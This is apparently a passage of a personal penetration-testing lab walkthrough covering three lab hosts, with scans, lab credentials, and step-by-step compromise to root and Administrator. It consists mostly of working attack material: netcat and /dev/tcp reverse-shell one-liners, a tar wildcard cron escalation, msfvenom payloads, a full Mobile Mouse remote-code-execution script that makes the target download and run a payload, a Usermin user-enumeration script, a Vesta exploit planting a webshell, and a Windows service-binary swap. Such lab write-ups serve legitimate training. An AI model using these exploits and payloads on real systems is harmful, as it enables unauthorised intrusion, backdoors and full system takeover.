301      GET        7l       20w      249c http://192.168.151.156/phpmyadmin/themes => http://192.168.151.156/phpmyadmin/themes/
301      GET        7l       20w      263c http://192.168.151.156/phpmyadmin/templates/components => http://192.168.151.156/phpmyadmin/templates/components/
301      GET        7l       20w      257c http://192.168.151.156/phpmyadmin/templates/test => http://192.168.151.156/phpmyadmin/templates/test/
301      GET        7l       20w      261c http://192.168.151.156/phpmyadmin/templates/database => http://192.168.151.156/phpmyadmin/templates/database/
301      GET        7l       20w      258c http://192.168.151.156/phpmyadmin/templates/error => http://192.168.151.156/phpmyadmin/templates/error/
301      GET        7l       20w      263c http://192.168.151.156/phpmyadmin/templates/javascript => http://192.168.151.156/phpmyadmin/templates/javascript/
301      GET        7l       20w      246c http://192.168.151.156/phpmyadmin/doc => http://192.168.151.156/phpmyadmin/doc/
301      GET        7l       20w      246c http://192.168.151.156/phpmyadmin/sql => http://192.168.151.156/phpmyadmin/sql/
401      GET       12l       46w      381c http://192.168.151.156/phpmyadmin/setup
301      GET        7l       20w      257c http://192.168.151.156/phpmyadmin/templates/list => http://192.168.151.156/phpmyadmin/templates/list/
301      GET        7l       20w      251c http://192.168.151.156/phpmyadmin/doc/html => http://192.168.151.156/phpmyadmin/doc/html/
301      GET        7l       20w      249c http://192.168.151.156/phpmyadmin/locale => http://192.168.151.156/phpmyadmin/locale/
403      GET        0l        0w     1226c http://192.168.151.156/webmail/XMLImporter
301      GET        7l       20w      263c http://192.168.151.156/phpmyadmin/templates/navigation => http://192.168.151.156/phpmyadmin/templates/navigation/
301      GET        7l       20w      252c http://192.168.151.156/phpmyadmin/js/jquery => http://192.168.151.156/phpmyadmin/js/jquery/
301      GET        7l       20w      259c http://192.168.151.156/phpmyadmin/doc/html/_images => http://192.168.151.156/phpmyadmin/doc/html/**_image**
```

![Pasted image 20260102134004.png](/ob/Pasted%20image%2020260102134004.png)

***

### Web Recon  8080🪲

The web 8080 is seem like the nginx proxy 80 proxy ,

![Pasted image 20260102134158.png](/ob/Pasted%20image%2020260102134158.png)

***

### Web Recon  8083 jack to root (vesta-rce-exploit)

{{< toggle "Tag 🏷️" >}}

{{< tag "vesta-rce-exploit" >}} using the exploit to RCE

{{< /toggle >}}

login as by jack : 3PUKsX98BMupBiCf

![Pasted image 20260102134916.png](/ob/Pasted%20image%2020260102134916.png)\
![Pasted image 20260102135052.png](/ob/Pasted%20image%2020260102135052.png)

next we need to find the rce to arrived the server

in here , i use the link of https://github.com/CSpanias/vesta-rce-exploit

![Pasted image 20260102140352.png](/ob/Pasted%20image%2020260102140352.png)

```
└─# uv add --script vesta-rce-exploit.py requests
warning: `VIRTUAL_ENV=/root/Desktop/haydon_env` does not match the script environment path `/root/.cache/uv/environments-v2/vesta-rce-exploit-7fe7eb902346382a` and will be ignored; use `--active` to target the active environment instead
Resolved 5 packages in 188ms                                   
```

```shell
└─# uv run vesta-rce-exploit.py https://192.168.151.156:8083 jack  3PUKsX98BMupBiCf

[INFO] Attempting login to https://192.168.151.156:8083 as jack
jack 3PUKsX98BMupBiCf
[+] Logged in as jack
[INFO] Checking for existing webshell or creating one
[!] nu9ijktfvr.poc not found, creating one...
[+] nu9ijktfvr.poc added
[+] nu9ijktfvr.poc found, looking up webshell
[!] webshell not found, creating one..
[+] Webshell uploaded
[INFO] Creating mailbox on domain nu9ijktfvr.poc
[!] Mail domain not found, creating one..
[+] Mail domain created
[+] Mail account created
[INFO] Editing mailbox to test payload
[INFO] Deploying backdoor via mailbox editing
[INFO] [+] Root shell possibly obtained. Enter commands:
# 

```

![Pasted image 20260102140523.png](/ob/Pasted%20image%2020260102140523.png)\
now we do the python upgrade to get the flag

![Pasted image 20260102140858.png](/ob/Pasted%20image%2020260102140858.png)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.203 8080 >/tmp/f



└─# sudo nc -lvnp 8080
listening on [any] 8080 ...
connect to [192.168.45.203] from (UNKNOWN) [192.168.151.156] 44244
bash: cannot set terminal process group (1293): Inappropriate ioctl for device
bash: no job control in this shell
root@oscp:/usr/local/vesta/web/api/v1/edit/mail# python3 -c 'import pty; pty.spawn("/bin/bash")'
<il# python3 -c 'import pty; pty.spawn("/bin/bash")'
root@oscp:/usr/local/vesta/web/api/v1/edit/mail# ^Z
zsh: suspended  sudo nc -lvnp 8080


└─# stty raw -echo;fg
[1]  + continued  sudo nc -lvnp 8080
                                    export TERM=xterm
root@oscp:/usr/local/vesta/web/api/v1/edit/mail# whoami 
root
root@oscp:/usr/local/vesta/web/api/v1/edit/mail# 




```

```
root@oscp:~# cat proof.txt
9ddasdasdasdsdasddddddddddddddddddddddddddddddddd
root@oscp:~# 
```

***

# Box Info 192.168.X.157

### ALL  Information Gathering/NMAP

```shell
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.151.157 -oN serviceScan.txt

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 14:16 HKT
Stats: 0:00:00 elapsed; 0 hosts completed (0 up), 0 undergoing Script Pre-Scan
NSE Timing: About 0.00% done
Nmap scan report for 192.168.151.157
Host is up (0.047s latency).

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_drwxr-xr-x    2 114      120          4096 Nov 02  2022 backup
| ftp-syst: 
|   STAT: 
| FTP server status:
|      Connected to ::ffff:192.168.45.203
|      Logged in as ftp
|      TYPE: ASCII
|      No session bandwidth limit
|      Session timeout in seconds is 300
|      Control connection is plain text
|      Data connections will be plain text
|      At session startup, client count was 1
|      vsFTPd 3.0.5 - secure, fast, stable
|_End of status
22/tcp    open  ssh     OpenSSH 8.9p1 Ubuntu 3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0e:ad:d7:de:60:2b:49:ef:42:3b:1e:76:9c:77:33:85 (ECDSA)
|_  256 99:b5:48:fb:77:df:18:b0:1d:ad:e0:92:f3:e1:26:0d (ED25519)
80/tcp    open  http    Apache httpd 2.4.52 ((Ubuntu))
|_http-server-header: Apache/2.4.52 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
20000/tcp open  http    MiniServ 1.820 (Webmin httpd)
|_http-server-header: MiniServ/1.820
|_http-title: Site doesn't have a title (text/html; Charset=utf-8).
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 14.92 second

```

```
└─# sudo nmap -sU --top-port=20 192.168.151.157

Starting Nmap 7.95 ( https://nmap.org ) at 2026-01-02 14:17 HKT
Nmap scan report for 192.168.151.157
Host is up (0.042s latency).

PORT      STATE         SERVICE
53/udp    closed        domain
67/udp    closed        dhcps
68/udp    closed        dhcpc
69/udp    closed        tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   closed        snmp
162/udp   open|filtered snmptrap
445/udp   closed        microsoft-ds
500/udp   closed        isakmp
514/udp   closed        syslog
520/udp   open|filtered route
631/udp   closed        ipp
1434/udp  closed        ms-sql-m
1900/udp  closed        upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 8.70 seconds

```

### FTP 21  -- Scans

```
└─#  ftp 192.168.151.157
Connected to 192.168.151.157.
220 (vsFTPd 3.0.5)
Name (192.168.151.157:root): anonymous
331 Please specify the password.
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
```

![Pasted image 20260102142044.png](/ob/Pasted%20image%2020260102142044.png)

### PDF Check

{{< toggle "Tag 🏷️" >}}

{{< tag "PDF-Check" >}} exiftool \*.pdf  to find 3 usernames

{{< /toggle >}}

```shell
└─# exiftool *.pdf              
======== BROCHURE-TEMPLATE.pdf
ExifTool Version Number         : 13.44
File Name                       : BROCHURE-TEMPLATE.pdf
Directory                       : .
File Size                       : 146 kB
File Modification Date/Time     : 2022:11:02 17:07:40+08:00
File Access Date/Time           : 2026:01:02 14:20:07+08:00
File Inode Change Date/Time     : 2026:01:02 14:20:07+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Producer                        : Microsoft® Word 2016
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:07:40+02:00
Modify Date                     : 2022:11:02 11:07:40+02:00
======== CALENDAR-TEMPLATE.pdf
ExifTool Version Number         : 13.44
File Name                       : CALENDAR-TEMPLATE.pdf
Directory                       : .
File Size                       : 160 kB
File Modification Date/Time     : 2022:11:02 17:34:14+08:00
File Access Date/Time           : 2026:01:02 14:20:13+08:00
File Inode Change Date/Time     : 2026:01:02 14:20:13+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Language                        : en-US
Tagged PDF                      : Yes
Producer                        : Microsoft® Word 2016
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:34:14+02:00
Modify Date                     : 2022:11:02 11:34:14+02:00
======== FUNCTION-TEMPLATE.pdf
ExifTool Version Number         : 13.44
File Name                       : FUNCTION-TEMPLATE.pdf
Directory                       : .
File Size                       : 337 kB
File Modification Date/Time     : 2022:11:02 17:38:03+08:00
File Access Date/Time           : 2026:01:02 14:31:04+08:00
File Inode Change Date/Time     : 2026:01:02 14:31:04+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 1
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Cassie
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:38:02+02:00
Modify Date                     : 2022:11:02 11:38:02+02:00
Producer                        : Microsoft® Word 2016
======== NEWSLETTER-TEMPLATE.pdf
ExifTool Version Number         : 13.44
File Name                       : NEWSLETTER-TEMPLATE.pdf
Directory                       : .
File Size                       : 739 kB
File Modification Date/Time     : 2022:11:02 17:11:56+08:00
File Access Date/Time           : 2026:01:02 14:20:18+08:00
File Inode Change Date/Time     : 2026:01:02 14:20:18+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Mark
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:11:56+02:00
Modify Date                     : 2022:11:02 11:11:56+02:00
Producer                        : Microsoft® Word 2016
======== REPORT-TEMPLATE.pdf
ExifTool Version Number         : 13.44
File Name                       : REPORT-TEMPLATE.pdf
Directory                       : .
File Size                       : 889 kB
File Modification Date/Time     : 2022:11:02 17:08:27+08:00
File Access Date/Time           : 2026:01:02 14:20:22+08:00
File Inode Change Date/Time     : 2026:01:02 14:20:22+08:00
File Permissions                : -rw-r--r--
File Type                       : PDF
File Type Extension             : pdf
MIME Type                       : application/pdf
PDF Version                     : 1.5
Linearized                      : No
Page Count                      : 2
Language                        : en-US
Tagged PDF                      : Yes
Author                          : Robert
Creator                         : Microsoft® Word 2016
Create Date                     : 2022:11:02 11:08:26+02:00
Modify Date                     : 2022:11:02 11:08:26+02:00
Producer                        : Microsoft® Word 2016
    5 image files read
                                                                   
```

```
Mark
Cassie
Robert
```

```
mark
cassie
robert
```

***

{{< toggle "Tag 🏷️" >}}

{{< tag "Web-login-bruteForce" >}} use the username and the password also is the username to login, and have the rce to get the shell

{{< /toggle >}}

### Web Recon 20000 To Cassie (cve-2024-44762 usermin rce)

we can login in by cassie:cassie

![Pasted image 20260102142604.png](/ob/Pasted%20image%2020260102142604.png)

That script of CVE can be tested to user enum , can add the name in the wordlist to test ;otherwise,  the website will block you

```java
# /// script
# requires-python = ">=3.13"
# dependencies = [
#     "requests>=2.32.5",
# ]
# ///

# Exploit Title: Webmin Usermin 2.100 - Username Enumeration
# Date: 10.02.2024
# Exploit Author: Kjesper
# Vendor Homepage: https://www.webmin.com/usermin.html
# Software Link: https://github.com/webmin/usermin
# Version: <= 2.100
# Tested on: Kali Linux
# CVE: CVE-2024-44762
# https://senscybersecurity.nl/cve-2024-44762-explained/
#!/usr/bin/python3
# -*- coding: utf-8 -*-
# Usermin - Username Enumeration (Version 2.100)
# Usage: UserEnumUsermin.py -u HOST -w WORDLIST_USERS
# Example: UserEnumUsermin.py -u https://127.0.0.1:20000 -w users.txt
import requests
import json
import requests
import argparse
import sys
from urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)
parser = argparse.ArgumentParser()
parser.add_argument("-u", "--url", help = "use -u with the url to the host of usermin, EX: \"-u https://127.0.0.1:20000\"")
parser.add_argument("-w", "--wordlist_users", help = "use -w with the username wordlist, EX: \"-w users.txt\"")
args = parser.parse_args()
if len(sys.argv) != 5:
    print("Please provide the -u for URL and -w for the wordlist containing the usernames")
    print("EX: python3 UsernameEnum.py -u https://127.0.0.1:20000 -w users.txt")
    exit()
   
usernameFile = open(args.wordlist_users, 'r')
dataUsername = usernameFile.read()
usernameFileIntoList = dataUsername.split("\n")
usernameFile.close()
for i in usernameFileIntoList:
    newHeaders = {'Content-type': 'application/x-www-form-urlencoded', 'Referer': '%s/password_change.cgi' % args.url}
    params = {'user':i, 'pam':'', 'expired':'2', 'old':'fakePassword', 'new1':'password', 'new2':'password'}
    response = requests.post('%s/password_change.cgi' % args.url, data=params, verify=False, headers=newHeaders)
    if "Failed to change password: The current password is incorrect." in response.text:
        print("Possible user found with username: " + i)
   
    if "Failed to change password: Your login name was not found in the password file!" not in response.text and "Failed to change password: The current password is incorrect." not in response.text:
        print("Application is most likely not vulnerable and are therefore quitting.")
        exit() # comment out line 33-35 if you would still like to try username enumeration.                                                                                                                 


```

```
└─# uv run 52114.py -u https://192.168.151.157:20000/ -w /usr/share/seclists/Usernames/top-usernames-shortlist.txt
Possible user found with username: root
Possible user found with username: ftp
Possible user found with username: cassie
```

![Pasted image 20260102161040.png](/ob/Pasted%20image%2020260102161040.png)

And then , use it  script to direct to do the  RCE\
https://github.com/tunahantekeoglu/userminrce/blob/main/exploit.py

```
wget https://raw.githubusercontent.com/tunahantekeoglu/userminrce/refs/heads/main/exploit.py
```

```
sudo nc -nlvp 80
listening on [any] 80 ...
connect to [192.168.45.203] from (UNKNOWN) [192.168.151.157] 32982
sh: cannot set terminal process group (1019): Inappropriate ioctl for device
sh: no job control in this shell
sh-5.1$ ls



└─# uv run exploit.py  --host 192.168.151.157 --login cassie  --password cassie --lhost 192.168.45.203  --lport 80
```

![Pasted image 20260102161618.png](/ob/Pasted%20image%2020260102161618.png)

```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc 192.168.45.203 21 >/tmp/f

```

### cassie to root (Cron tar Wild Privilege Escalation)

{{< toggle "Tag 🏷️" >}}

{{< tag "Linux-Privilege-Escalation-Cron-tar-Wild" >}} found the 2minutes in /etc/crontab.d , inject it to get the root with tar Wild Privilege Escalation\
{{< /toggle >}}

cron show something should not by here

```
ls -al /etc/cron*
```

![Pasted image 20260105165811.png](/ob/Pasted%20image%2020260105165811.png)

\`\`

```
cat /etc/cron.d/e2scrub_all
```

```
cassie@oscp:/usr/share/usermin/gnupg/$ cat /etc/cron.d/2minutes                                                                               
cat /etc/cron.d/2minutes                                                                                                                      
SHELL=/bin/bash                                                                                                                               
PATH=/sbin:/bin:/usr/sbin:/usr/bin                                                                                                            
*/2 * * * * root cd /opt/admin && tar -zxf /tmp/backup.tar.gz *                                                                               
cassie@oscp:/usr/share/usermin/gnupg/$                                                                                                        
                                             
```

* Check the execution status of "2 minutes" using the command `ls -al /etc/cron*`, which is executed by the root user every 2 minutes.

![Pasted image 20260105213814.png](/ob/Pasted%20image%2020260105213814.png)

```
cat /etc/cron.d/2minutes
```

This `2minutes` shows that it will use the `tar` command to decompress files from the `/opt/admin` directory, which is also managed by our user. Furthermore, the `tar -xzf filename *` command is an important privilege escalation hint, as we can use the `*` command to obtain any archive. Therefore, we will use `touch ./--checkpoint=1 `,`touch ./--checkpoint-action=exec=sh\ shell.sh`,`echo "bash -i >& /dev/tcp/192.168.45.186/20000 0>&1" > shell.sh` to obtain a shell in `/opt/admin`.

![Pasted image 20260105214154.png](/ob/Pasted%20image%2020260105214154.png)

![Pasted image 20260105214251.png](/ob/Pasted%20image%2020260105214251.png)

```
nc -lvnp 20000  
```

```
touch ./--checkpoint=1  
touch ./--checkpoint-action=exec=sh\ shell.sh
echo "bash -i >& /dev/tcp/192.168.45.186/20000 0>&1" > shell.sh
```

***

# Box Info  192.168.X.155

### ALL  Information Gathering/NMAP

```
└─# sudo nmap -sC -sV -p $(grep -Eo '^[0-9]+/tcp' openPort.txt | cut -d/ -f1 | paste -sd, -) -T4 192.168.151.155 -oN serviceScan.txt

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 15:07 +0800
Nmap scan report for 192.168.151.155
Host is up (0.043s latency).

PORT      STATE SERVICE VERSION
80/tcp    open  http    Microsoft IIS httpd 10.0
|_http-title: IIS Windows
| http-methods: 
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
		9099/tcp  open  unknown
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK 
|     Server: Mobile Mouse Server 
|     Content-Type: text/html 
|     Content-Length: 321
|_    <HTML><HEAD><TITLE>Success!</TITLE><meta name="viewport" content="width=device-width,user-scalable=no" /></HEAD><BODY BGCOLOR=#000000><br><br><p style="font:12pt arial,geneva,sans-serif; text-align:center; color:green; font-weight:bold;" >The server running on "OSCP" was able to receive your request.</p></BODY></HTML>
9999/tcp  open  abyss?
35913/tcp open  unknown
	1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
	SF-Port9099-TCP:V=7.98%I=7%D=1/2%Time=69576EC6%P=x86_64-pc-linux-gnu%r(Get
	SF:Request,1A2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mouse\x
	SF:20Server\x20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x2032
	SF:1\r\n\r\n<HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewport\"\
	SF:x20content=\"width=device-width,user-scalable=no\"\x20/></HEAD><BODY\x2
	SF:0BGCOLOR=#000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sans-s
	SF:erif;\x20text-align:center;\x20color:green;\x20font-weight:bold;\"\x20>
	SF:The\x20server\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20rece
	SF:ive\x20your\x20request\.</p></BODY></HTML>\r\n")%r(FourOhFourRequest,1A
	SF:2,"HTTP/1\.0\x20200\x20OK\x20\r\nServer:\x20Mobile\x20Mouse\x20Server\x
	SF:20\r\nContent-Type:\x20text/html\x20\r\nContent-Length:\x20321\r\n\r\n<
	SF:HTML><HEAD><TITLE>Success!</TITLE><meta\x20name=\"viewport\"\x20content
	SF:=\"width=device-width,user-scalable=no\"\x20/></HEAD><BODY\x20BGCOLOR=#
	SF:000000><br><br><p\x20style=\"font:12pt\x20arial,geneva,sans-serif;\x20t
	SF:ext-align:center;\x20color:green;\x20font-weight:bold;\"\x20>The\x20ser
	SF:ver\x20running\x20on\x20\"OSCP\"\x20was\x20able\x20to\x20receive\x20you
	SF:r\x20request\.</p></BODY></HTML>\r\n");
	Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 214.80 seconds
                                                                       
```

```shell

└─# sudo nmap -sU --top-port=20 192.168.151.155

Starting Nmap 7.98 ( https://nmap.org ) at 2026-01-02 15:14 +0800
Nmap scan report for 192.168.151.155
Host is up (0.043s latency).

PORT      STATE         SERVICE
53/udp    open|filtered domain
67/udp    open|filtered dhcps
68/udp    open|filtered dhcpc
69/udp    open|filtered tftp
123/udp   open|filtered ntp
135/udp   open|filtered msrpc
137/udp   open|filtered netbios-ns
138/udp   open|filtered netbios-dgm
139/udp   open|filtered netbios-ssn
161/udp   open|filtered snmp
162/udp   open|filtered snmptrap
445/udp   open|filtered microsoft-ds
500/udp   open|filtered isakmp
514/udp   open|filtered syslog
520/udp   open|filtered route
631/udp   open|filtered ipp
1434/udp  open|filtered ms-sql-m
1900/udp  open|filtered upnp
4500/udp  open|filtered nat-t-ike
49152/udp open|filtered unknown

Nmap done: 1 IP address (1 host up) scanned in 2.86 seconds

```

### Unkown Port  -- Scans  9999

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
```

### Unkown Port  -- Scans  35913

> 如果允許任何匿名存取，這可能是取得檔和其他資訊的最佳位置。

```
```

### Web Recon 80

![Pasted image 20260106155231.png](/ob/Pasted%20image%2020260106155231.png)

### Web Recon   9099

![Pasted image 20260106155152.png](/ob/Pasted%20image%2020260106155152.png)

### WebSite Directory BurteForce

```shell
─#     feroxbuster -u http://192.168.126.155:9099/ -k 
                                                                                                                    
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.13.1
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.126.155:9099/
 🚩  In-Scope Url          │ 192.168.126.155
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/Web-Content/raft-medium-directories.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.13.1
 💉  Config File           │ /etc/feroxbuster/ferox-config.toml
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
200      GET        1l       21w      321c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
[###########] - 2m     30000/30000   0s      found:0       errors:3494   
[###########] - 2m     30000/30000   275/s   http://192.168.126.155:9099/                                                                                                                       
```

### Web To Tom  (Mobile Mouse Server RCE)

```shell
whatweb http://192.168.126.155:9099/                                                                      
		http://192.168.126.155:9099/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Mobile Mouse Server], IP[192.168.126.155], Title[Success!]                                                                                                                                          
```

![Pasted image 20260106155347.png](/ob/Pasted%20image%2020260106155347.png)

```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.202 LPORT=80 -f exe -o reverse.exe
```

```
 rlwrap nc -nvlp 80
```

```
sudo python3 -m http.server 8080
```

```
─# cat exploit.py
# Exploit Title: Mobile Mouse 3.6.0.4 - Remote Code Execution (RCE)
# Date: Aug 09, 2022
# Exploit Author: Chokri Hammedi
# Vendor Homepage: https://mobilemouse.com/
# Software Link: https://www.mobilemouse.com/downloads/setup.exe
# Version: 3.6.0.4
# Tested on: Windows 10 Enterprise LTSC Build 17763

#!/usr/bin/env python3

import socket
from time import sleep
import argparse

help = " Mobile Mouse 3.6.0.4 Remote Code Execution "
parser = argparse.ArgumentParser(description=help)
parser.add_argument("--target", help="Target IP", required=True)
parser.add_argument("--file", help="File name to Upload")
parser.add_argument("--lhost", help="Your local IP", default="127.0.0.1")

args = parser.parse_args()

host = args.target
command_shell = args.file
lhost = args.lhost
port = 9099 # Default Port

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((host, port))

CONN = bytearray.fromhex("434F4E4E4543541E1E63686F6B726968616D6D6564691E6950686F6E651E321E321E04")
s.send(CONN)
run = s.recv(54)

RUN = bytearray.fromhex("4b45591e3131341e721e4f505404")
s.send(RUN)
run = s.recv(54)

sleep(0.5)

download_string=f"curl http://{lhost}:8080/{command_shell} -o c:\Windows\Temp\{command_shell}".encode('utf-8')
hex_shell = download_string.hex()
SHELL = bytearray.fromhex("4B45591E3130301E" + hex_shell + "1E04" +
"4b45591e2d311e454e5445521e04")
s.send(SHELL)
shell = s.recv(96)

print ("Executing The Command Shell...")

sleep(1.2)
RUN2 = bytearray.fromhex("4b45591e3131341e721e4f505404")
s.send(RUN2)
run2 = s.recv(54)

shell_string= f"c:\Windows\Temp\{command_shell}".encode('utf-8')
hex_run = shell_string.hex()
RUN3 = bytearray.fromhex("4B45591E3130301E" + hex_run + "1E04" +
"4b45591e2d311e454e5445521e04")
s.send(RUN3)
run3 = s.recv(96)

print (" Take The Rose")

sleep(10)
s.close()
```

```
uv run exploit.py --target 192.168.126.155  --file   ./rev80.exe --lhost 192.168.45.202 
```

![Pasted image 20260106163407.png](/ob/Pasted%20image%2020260106163407.png)

### Tom to Admin (GPGService.exe Local Privilege Escalation)

{{< toggle "Tag 🏷️" >}}

{{< tag "Windows-Privilege-Escalation-GPGservice" >}} repalce the service as my revshell shell to get the admin due to weak control

{{< /toggle >}}

After login as Tom, use the winpeas.exe to check the file , and found the MilleGPG5 is easy to be attacked

```
�����������������������������������͹ Services Information �������������������������������������

����������͹ Interesting Services -non Microsoft-
� Check if you can overwrite some service binary or perform a DLL hijacking, also check for unquoted paths https://book.hacktricks.wiki/en/windows-hardening/windows-local-privilege-escalation/index.html#services                                                                                                                                                                                             
    Bonjour Service(Apple Inc. - Bonjour Service)["C:\Program Files (x86)\Bonjour\mDNSResponder.exe"] - Auto - Running
    Enables hardware devices and software services to automatically configure themselves on the network and advertise their presence.
   =================================================================================================                                                                                                    

    GPGOrchestrator(Genomedics srl - GPG Orchestrator)["C:\Program Files\MilleGPG5\GPGService.exe"] - Auto - Running
    YOU CAN MODIFY THIS SERVICE: AllAccess
    File Permissions: Users [Allow: WriteData/CreateFiles]
    Possible DLL Hijacking in binary folder: C:\Program Files\MilleGPG5 (Users [Allow: WriteData/CreateFiles])
   =================================================================================================

    MariaDB-GPG(MariaDB-GPG)["C:\Program Files\MilleGPG5\MariaDB\bin\mysqld.exe" MariaDB-GPG] - Auto - Running
   =================================================================================================

    ssh-agent(OpenSSH Authentication Agent)[C:\Windows\System32\OpenSSH\ssh-agent.exe] - Disabled - Stopped
    Agent to hold private keys used for public key authentication.
   =================================================================================================                                                                                                    

    VGAuthService(VMware, Inc. - VMware Alias Manager and Ticket Service)["C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"] - Auto - Running
    Alias Manager and Ticket Service
   =================================================================================================                                                                                                    

    vm3dservice(VMware, Inc. - VMware SVGA Helper Service)[C:\Windows\system32\vm3dservice.exe] - Auto - Running
    Helps VMware SVGA driver by collecting and conveying user mode information
   =================================================================================================                                                                                                    

    VMTools(VMware, Inc. - VMware Tools)["C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"] - Auto - Running

```

The strongest path remains the MilleGPG5 software (especially the GPGOrchestrator service), as evidenced by publicly disclosed exploits from 2021 to 2023 (such as Exploit-DB 50558 in v5.7.2 and 51410/CVE-20233 in v5.9.2). These files show weak or insecure permissions in C:\Program Files\MilleGPG5 and its subfolders/files, preventing low-privilege users (such as Tim) from overriding the binary service executed by LocalSystem.

```
msfvenom -p windows/x64/shell/reverse_tcp LHOST=192.168.45.244 LPORT=35913 -f exe -o admin.exe
```

```
upload the admin.exe to /promgramdata
```

![Pasted image 20260107153504.png](/ob/Pasted%20image%2020260107153504.png)

replace the GPGService.exe by you admin.exe

```shell
C:\Programdata>copy admin.exe "C:\Program Files\MilleGPG5\GPGService.exe"
copy admin.exe "C:\Program Files\MilleGPG5\GPGService.exe"
Overwrite C:\Program Files\MilleGPG5\GPGService.exe? (Yes/No/All): Yes
Yes
        1 file(s) copied.


```

check the file size to ensure the admin is successfully to replace the GPGService.exe\
![Pasted image 20260107153556.png](/ob/Pasted%20image%2020260107153556.png)

start the service to active the admin.exe(GPGService.exe) to connect the msfconsole

```
C:\Programdata>sc query GPGOrchestrator
sc query GPGOrchestrator

SERVICE_NAME: GPGOrchestrator 
        TYPE               : 10  WIN32_OWN_PROCESS  
        STATE              : 1  STOPPED 
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

```

![Pasted image 20260107153621.png](/ob/Pasted%20image%2020260107153621.png)

```
C:\Programdata>sc start GPGOrchestrator
sc start GPGOrchestrator
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.
```

![Pasted image 20260107153737.png](/ob/Pasted%20image%2020260107153737.png)

```
└─# sudo msfconsole
msf exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
msf exploit(multi/handler) > 
msf exploit(multi/handler) >  set LHOST 192.168.45.244
LHOST => 192.168.45.244
msf exploit(multi/handler) > set LPORT 35913
LPORT => 35913
msf exploit(multi/handler) exploit
[*] Started reverse TCP handler on 192.168.45.244:35913 
[*] Sending stage (230982 bytes) to 192.168.155.155
[*] Meterpreter session 1 opened (192.168.45.244:35913 -> 192.168.155.155:53728) at 2026-01-07 15:23:44 +0800
```

DONEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEEE>,<

![Pasted image 20260107152839.png](/ob/Pasted%20image%2020260107152839.png)
